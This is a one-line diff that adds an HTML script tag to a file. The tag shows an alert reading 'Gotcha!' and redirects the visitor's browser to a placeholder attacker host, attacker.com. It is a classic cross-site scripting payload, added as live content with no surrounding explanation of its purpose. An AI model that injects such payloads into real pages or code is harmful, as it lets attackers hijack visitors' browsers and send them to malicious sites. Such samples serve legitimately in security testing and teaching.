@@ -1,0 +1,1 @@
+<script>alert('Gotcha!');window.location.replace('http://attacker.com');</script>
